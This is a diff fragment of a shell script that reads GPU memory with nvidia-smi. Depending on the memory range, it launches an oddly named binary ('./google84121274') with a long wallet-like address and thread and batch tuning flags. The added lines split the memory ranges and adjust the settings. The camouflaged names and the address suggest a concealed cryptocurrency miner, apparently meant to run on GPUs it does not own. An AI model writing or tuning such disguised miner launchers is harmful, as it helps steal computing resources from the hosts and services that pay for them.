@@ -24,10 +24,22 @@ then
 
 google84=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
-if (($google84 >= 9188 && $google84 <= 16884));
+if (($google84 >= 14884 && $google84 <= 16884));
 then
 
 timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 30 -b 30
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
+fi
+
+if (($google84 >= 10884 && $google84 <= 14882));
+then
+
+timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 22 -b 22
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -88,10 +100,22 @@ then
 
 google84=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
-if (($google84 >= 9188 && $google84 <= 16884));
+if (($google84 >= 14884 && $google84 <= 16884));
 then
 
 timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 29
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
+fi
+
+if (($google84 >= 10884 && $google84 <= 14882));
+then
+
+timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 20
 if [ $? -eq 124 ]; then
 echo "google84"
 else
